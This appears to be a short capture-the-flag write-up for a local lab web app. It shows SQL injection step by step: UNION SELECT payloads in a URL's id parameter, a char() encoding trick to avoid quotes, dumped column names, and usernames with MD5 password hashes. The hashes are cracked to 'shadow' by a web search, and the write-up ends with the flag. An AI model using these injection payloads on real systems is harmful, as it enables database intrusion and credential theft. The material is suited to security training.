


e1z2r10p4% python -c 'print([ord(c) for c in "Member_Brute_Force"]);'       
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]


http://192.168.99.100/?page=member&id=-1 union select column_name, column_type from information_schema.columns where table_schema=char(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)&Submit=Submit



ID: -1 union select column_name, column_type from information_schema.columns where table_schema=char(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
First name: id
Surname : int(11)
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=char(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
First name: username
Surname : varchar(20)
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=char(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
First name: password
Surname : varchar(50)



http://192.168.99.100/?page=member&id=-1 union select username, password from Member_Brute_Force.db_default&Submit=Submit


ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8


google the hash, md5 of string `shadow`

tada!

THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2


